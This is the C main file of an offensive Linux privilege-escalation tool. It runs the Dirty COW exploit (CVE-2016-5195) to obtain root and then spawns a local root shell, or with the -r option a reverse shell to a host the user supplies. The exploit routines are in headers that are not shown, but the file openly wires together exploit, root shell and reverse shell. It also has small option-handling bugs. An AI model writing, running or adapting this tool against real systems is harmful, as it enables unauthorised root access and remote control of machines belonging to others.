#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>

#include "exploits.h"
#include "main.h"
#include "actions.h"

int exploit = 1;
int action = 0;

void usage(){
	fprintf (stderr, "Usage: %s [options]\n", self[0]);
	fprintf (stderr, "Exploit options:\n");
	fprintf (stderr, "	-d: (default) Dirtycow CVE-2016-5195\n");
	fprintf (stderr, "Action options:\n");
	fprintf (stderr, "	-l: (default) Execute local shell after root is obtained\n");
	if (exploit == 1)
		dirtycow_help();
	if (action == 0)
		action_local_shell_help();
	if (action == 1)
		action_local_shell_help();
}

// https://www.gnu.org/software/libc/manual/html_node/Example-of-Getopt.html
int main(int argc,char *argv[]) {
	self[0] = argv[0];
	int euid=geteuid();
	int c;
	char *cvalue = NULL;

	while ((c = getopt (argc, argv, "ndlhr:")) != -1)
	switch (c)
	{
		case 'n':
			exploit = 0;
			break;
		case 'd':
			action = 0;
			break;
		case 'l':
			action = 0;
			break;
		case 'h':
			usage();
			return 0;
			break;
		case 'r':
			action = 1;
			cvalue = optarg;
			break;
		case '?':
			if (optopt == 'r')
				fprintf (stderr, "[-] Option -%c requires an argument.\n", optopt);
			else if (isprint (optopt))
				fprintf (stderr, "[-] Unknown option `-%c'.\n", optopt);
			else
				fprintf (stderr,
					"[-] Unknown option character `\\x%x'.\n",
					optopt);
				usage();
			return 1;
		}

	printf("[+] Payload running euid: %d exploit: %d action: %d\n", euid, exploit, action);
	if (exploit == 1)
		dirtycow_init(euid);
	if (exploit == 0 || euid == 0) {
		printf("[+] Action running\n");
		if (action == 0)
			return action_local_shell();
		else if (action == 1)
			return action_reverse_shell(cvalue);
	}
	printf("[+] Launching exploit\n");
	if (exploit == 1)
		return dirtycow_run();
}
